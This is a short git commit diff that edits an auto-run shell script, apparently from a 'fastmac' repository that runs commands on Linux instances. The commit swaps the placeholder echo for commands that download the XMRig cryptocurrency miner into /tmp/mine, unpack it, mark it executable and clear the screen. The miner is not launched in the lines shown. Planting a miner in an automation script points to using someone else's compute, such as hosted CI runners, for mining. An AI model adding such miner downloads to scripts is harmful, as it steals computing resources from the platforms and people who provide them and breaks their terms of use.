0315943f3e0a27268bc4990935e1cb6c21982673
آرین عباسی <86650611+arianabbasi1389@users.noreply.github.com>
2022-05-23 14:28:41 +0430

    Update script-linux.sh

--- script-linux.sh
+++ script-linux.sh
@@ -1,1 +1,8 @@
-echo Edit script-linux.sh in your fastmac repo to auto-run commands in your linux instances
+cd /tmp
+mkdir mine
+cd mine
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+chmod +x xmrig
+clear
